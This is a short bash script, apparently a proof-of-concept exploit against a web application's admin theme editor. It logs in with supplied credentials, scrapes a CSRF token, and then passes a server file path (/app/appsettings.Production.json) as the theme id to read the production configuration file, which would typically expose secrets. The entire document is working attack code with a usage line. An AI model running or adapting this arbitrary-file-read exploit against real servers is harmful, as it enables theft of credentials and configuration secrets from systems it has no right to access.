#!/bin/bash

if [[ $# -eq 0 ]]
then
    echo "USAGE: $0 <username> <password>"
    exit 1
fi

rhost="http://localhost"
username=$1
password=$2
cookieJar=`mktemp`

xsrf_token=$(curl -c $cookieJar -s "$rhost/Identity/Login" | htmlq 'input[name=xsrf_token]' -a value)

curl -b $cookieJar -c $cookieJar "$rhost/Identity/Login?handler=Login" \
        --data-urlencode "Data.Email=$username" \
        --data-urlencode "Data.Password=$password" \
        --data-urlencode "xsrf_token=$xsrf_token"

curl -s -b $cookieJar "$rhost/Admin/Theme/Edit?id=/app/appsettings.Production.json" | htmlq -t textarea